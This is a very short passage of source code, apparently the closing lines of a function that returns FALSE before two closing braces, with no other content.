		return FALSE;			
	}
}
